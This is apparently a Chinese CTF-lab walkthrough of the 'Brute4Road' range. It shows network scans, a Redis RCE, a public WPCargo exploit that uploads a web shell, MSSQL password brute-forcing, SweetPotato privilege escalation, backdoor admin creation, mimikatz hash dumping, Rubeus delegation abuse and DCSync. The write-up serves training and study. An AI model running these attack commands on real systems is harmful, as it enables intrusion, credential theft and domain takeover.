          <h1 id="FLAG1-amp-FLAG2"><a href="#FLAG1-amp-FLAG2" class="headerlink" title="FLAG1&amp;FLAG2"></a>FLAG1&amp;FLAG2</h1><p>先用fscan扫一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# ../pentest/fscan/fscan2 -h 39.99.231.184</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-15 02:37:33] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-15 02:37:33] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-15 02:37:33] [INFO] 最终有效主机数量: 1</span><br><span class="line">[2025-04-15 02:37:33] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-15 02:37:33] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:6379</span><br><span class="line">[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:80</span><br><span class="line">[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:21</span><br><span class="line">[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:22</span><br><span class="line">[2025-04-15 02:37:33] [SUCCESS] 服务识别 39.99.231.184:21 =&gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]</span><br><span class="line">[2025-04-15 02:37:34] [SUCCESS] 服务识别 39.99.231.184:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]</span><br><span class="line">[2025-04-15 02:37:38] [SUCCESS] 服务识别 39.99.231.184:6379 =&gt; [redis] 版本:5.0.12 产品:Redis key-value store</span><br><span class="line">[2025-04-15 02:37:39] [SUCCESS] 服务识别 39.99.231.184:80 =&gt; [http] 版本:1.20.1 产品:nginx</span><br><span class="line">[2025-04-15 02:37:43] [INFO] 存活端口数量: 4</span><br><span class="line">[2025-04-15 02:37:43] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-15 02:37:43] [INFO] 加载的插件: ftp, redis, ssh, webpoc, webtitle</span><br><span class="line">[2025-04-15 02:37:43] [SUCCESS] 网站标题 http://39.99.231.184      状态码:200 长度:4833   标题:Welcome to CentOS</span><br><span class="line">[2025-04-15 02:37:44] [SUCCESS] 匿名登录成功!</span><br><span class="line">[2025-04-15 02:37:46] [SUCCESS] Redis 39.99.231.184:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb</span><br><span class="line">[2025-04-15 02:37:50] [SUCCESS] Redis无密码连接成功: 39.99.231.184:6379</span><br><span class="line">[2025-04-15 02:37:53] [SUCCESS] 扫描已完成: 5/5</span><br></pre></td></tr></table></figure>

<p>打redis主从复制rce，flag在/home/redis/flag下，但是没有权限读，base64具有suid权限，可以用base64读取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/base64 ./flag01|/usr/bin/base64 -d</span><br></pre></td></tr></table></figure>

<p>ftp服务只有一个pub文件夹，没什么用，上传fscan扫描一下内网</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.2.7/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-15 15:22:58] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-15 15:22:58] [INFO] CIDR范围: 172.22.2.0-172.22.2.255</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 生成IP范围: 172.22.2.0.%!d(string=172.22.2.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 解析CIDR 172.22.2.7/24 -&gt; IP范围 172.22.2.0-172.22.2.255</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 正在尝试无监听ICMP探测...</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 当前用户权限不足,无法发送ICMP包</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 切换为PING方式探测...</span><br><span class="line">[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.3      存活 (ICMP)</span><br><span class="line">[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.7      存活 (ICMP)</span><br><span class="line">[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.16     存活 (ICMP)</span><br><span class="line">[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.18     存活 (ICMP)</span><br><span class="line">[2025-04-15 15:22:59] [SUCCESS] 目标 172.22.2.34     存活 (ICMP)</span><br><span class="line">[2025-04-15 15:23:04] [INFO] 存活主机数量: 5</span><br><span class="line">[2025-04-15 15:23:04] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:88</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:80</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:80</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:80</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:22</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:22</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:21</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:139</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:139</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.34:135</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:135</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:139</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:135</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.34:445</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:445</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:445</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:445</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:389</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.34:139</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:1433</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:6379</span><br><span class="line">[2025-04-15 15:23:05] [SUCCESS] 服务识别 172.22.2.18:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-04-15 15:23:05] [SUCCESS] 服务识别 172.22.2.7:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]</span><br><span class="line">[2025-04-15 15:23:05] [SUCCESS] 服务识别 172.22.2.7:21 =&gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]</span><br><span class="line">[2025-04-15 15:23:09] [SUCCESS] 服务识别 172.22.2.3:88 =&gt; </span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:80 =&gt; [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.7:80 =&gt; [http] 版本:1.20.1 产品:nginx</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.3:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.18:80 =&gt; [http]</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.34:445 =&gt; </span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:445 =&gt; </span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.3:445 =&gt; </span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.3:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.34:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:1433 =&gt; [ms-sql-s] 版本:13.00.4001; SP1 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.]</span><br><span class="line">[2025-04-15 15:24:05] [SUCCESS] 服务识别 172.22.2.18:139 =&gt; </span><br><span class="line">[2025-04-15 15:24:05] [SUCCESS] 服务识别 172.22.2.18:445 =&gt; </span><br><span class="line">[2025-04-15 15:24:05] [SUCCESS] 服务识别 172.22.2.7:6379 =&gt; </span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 服务识别 172.22.2.34:135 =&gt; </span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 服务识别 172.22.2.16:135 =&gt; </span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 服务识别 172.22.2.3:135 =&gt; </span><br><span class="line">[2025-04-15 15:24:10] [INFO] 存活端口数量: 21</span><br><span class="line">[2025-04-15 15:24:10] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-15 15:24:10] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.34</span><br><span class="line">主机名: CLIENT01</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.34</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.3</span><br><span class="line">主机名: DC</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.3</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.16</span><br><span class="line">主机名: MSSQLSERVER</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.16</span><br><span class="line">[2025-04-15 15:24:10] [INFO] 系统信息 172.22.2.3 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.34     XIAORANG\CLIENT01             </span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 网站标题 http://172.22.2.16        状态码:404 长度:315    标题:Not Found</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 网站标题 http://172.22.2.7         状态码:200 长度:4833   标题:Welcome to CentOS</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.3      DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-04-15 15:24:10] [INFO] 系统信息 172.22.2.16 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        </span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 172.22.2.34 CVE-2020-0796 SmbGhost Vulnerable</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 匿名登录成功!</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] SMB认证成功 172.22.2.18:445 administrator:123456</span><br><span class="line">[2025-04-15 15:24:10] [INFO] SMB2共享信息 172.22.2.18:445 administrator Pass:123456 共享:[print$ IPC$]</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 网站标题 http://172.22.2.18        状态码:200 长度:57738  标题:又一个WordPress站点</span><br><span class="line">[2025-04-15 15:24:12] [INFO] SMB2共享信息 172.22.2.16:445 admin Pass:123456 共享:[ADMIN$ C$ fileshare IPC$]</span><br><span class="line">[2025-04-15 15:24:18] [SUCCESS] SMB认证成功 172.22.2.16:445 admin:123456</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>扫到一堆哦一个一个看，172.22.2.18的80端口是一个wps，用wpscan扫一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] wpcargo</span><br><span class="line"> | Location: http://172.22.2.18/wp-content/plugins/wpcargo/</span><br><span class="line"> | Last Updated: 2024-08-08T17:00:00.000Z</span><br><span class="line"> | [!] The version is out of date, the latest version is 7.0.6</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | [!] 6 vulnerabilities identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WPCargo &lt; 6.9.0 - Unauthenticated RCE</span><br><span class="line"> |     Fixed in: 6.9.0</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25003</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WPCargo Track &amp; Trace &lt; 6.9.5 - Reflected Cross Site Scripting</span><br><span class="line"> |     Fixed in: 6.9.5</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/d5c6f894-6ad1-46f4-bd77-17ad9234cfc3</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1436</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WPCargo Track &amp; Trace &lt; 6.9.5 - Admin+ Stored Cross Site Scripting</span><br><span class="line"> |     Fixed in: 6.9.5</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/ef5aa8a7-23a7-4ce0-bb09-d9c986386114</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1435</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WPCargo Track &amp; Trace &lt;= 7.0.6 - Unauthenticated SQL Injection</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/f5fdb762-cbc1-4352-9ab2-cbba9d3d33e2</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-44004</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0e725ec0-4897-4ba7-a803-80e8aafacbd1</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WPCargo Track &amp; Trace &lt;= 7.0.6 - Missing authorization to Authenticated (Subscriber+) Settings Update</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/b433fff9-b501-4fb3-9f04-5e18b64b0a90</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-54271</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0c467a78-1ba4-4c0d-84e6-db54fc1b0c63</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WPCargo Track &amp; Trace &lt;= 7.0.6 - Authenticated (Contributor+) Insecure Direct Object Reference</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/594ae221-06b6-4bc2-b5b6-0f9bac880f7b</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-31609</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/887ecedb-0bc8-4488-b6fa-27cfa22345e6</span><br><span class="line"> |</span><br><span class="line"> | Version: 6.x.x (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt</span><br></pre></td></tr></table></figure>

<p>存在wpcargo插件，有一个rce的漏洞<a target="_blank" rel="noopener" href="https://github.com/biulove0x/CVE-2021-25003">https://github.com/biulove0x/CVE-2021-25003</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# python3 2 -t &quot;http://172.22.2.18/&quot;</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line"></span><br><span class="line">############################################</span><br><span class="line"># @author : biulove0x                      #</span><br><span class="line"># @name   : WP Plugins WPCargo Exploiter   #</span><br><span class="line"># @cve    : CVE-2021-25003                 #</span><br><span class="line">############################################</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.22.2.18:80  ...  OK</span><br><span class="line">[-] http://172.22.2.18/wp-content/wp-conf.php =&gt; Uploaded!</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road1.png"></p>
<p>蚁剑连接，可以拿到数据库的密码</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road2.png"></p>
<p>flag2在数据库里</p>
<h1 id="FLAG3"><a href="#FLAG3" class="headerlink" title="FLAG3"></a>FLAG3</h1><p>在另一张表里有很多密码</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road3.png"></p>
<p>是172.22.2.16 msssql数据库的密码本，然后动手爆破，mssql的默认用户名是<code>sa</code>，因为导出来的有空格，所以把前面的空格处理掉</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─# grep -P &quot;\w+&quot; pass -o &gt;2</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─# hydra -l sa -P pass 172.22.2.16 mssql -f -I -vV</span><br><span class="line">[1433][mssql] host: 172.22.2.16   login: sa   password: ElGNkOiC</span><br></pre></td></tr></table></figure>

<p>然后用MDUT连接</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road4.png"></p>
<p>上传<a target="_blank" rel="noopener" href="https://github.com/uknowsec/SweetPotato?tab=readme-ov-file">sweetpotato.exe</a>然后提权</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road5.png"></p>
<p>flag03在C:\Users\Administrator\flag\下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a &quot;type C:\Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure>

<h1 id="FLAG4"><a href="#FLAG4" class="headerlink" title="FLAG4"></a>FLAG4</h1><p>netstat -ano发现开启了3389</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4</span><br><span class="line"></span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       692</span><br><span class="line"></span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line"></span><br><span class="line">  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       2680</span><br><span class="line"></span><br><span class="line">  TCP    0.0.0.0:2383           0.0.0.0:0              LISTENING       2932</span><br><span class="line"></span><br><span class="line">  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       812</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>添加一个用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a &quot;net user lv Asd123123 /add&quot;</span><br><span class="line">C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a &quot;net localgroup administrators lv /add&quot;</span><br></pre></td></tr></table></figure>

<p>然后远程桌面登录</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road6.png"></p>
<p>可以发现有域环境，先上传mimikatz提取hash，上传bloodhound可以发现有约束性委派</p>
<p>获取到域用户的哈希为cea3e66a2715c71423e7d3f0ff6cd352</p>
<p>通过Rubeus申请机器账户MSSQLSERVER的TGT，执行后，将得到 Base64 加密后的 TGT 票据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:cea3e66a2715c71423e7d3f0ff6cd352 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br></pre></td></tr></table></figure>

<p>然后使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票据，并将得到的票据传递到内存中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:[base64(ticket.kirbi)]</span><br></pre></td></tr></table></figure>

<p>LDAP服务具有DCSync权限，可以导出域内用户哈希</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot; exit</span><br></pre></td></tr></table></figure>

<p>得到域管的哈希为1a19251fbd935969832616366ae3fe62</p>
<p>然后就可以用WMI服务登录域控，flag在C:\Users\Administrator\flag下</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="lvzhouhang">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | lvzhouhang">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
